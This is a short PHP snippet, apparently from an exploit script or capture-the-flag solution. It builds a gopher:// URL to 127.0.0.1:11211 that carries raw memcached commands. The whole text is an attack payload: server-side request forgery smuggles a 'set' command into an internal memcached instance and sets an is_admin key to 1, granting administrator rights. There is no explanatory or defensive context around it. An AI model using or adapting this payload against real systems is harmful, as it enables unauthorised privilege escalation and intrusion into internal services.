<?php
$payload  = "1\r\n";
$payload .= "set 14966882_is_admin 0 0 1\r\n";
$payload .= "1\r\n";
$payload .= "quit";

$url = "gopher://127.0.0.1:11211/" . rawurlencode($payload);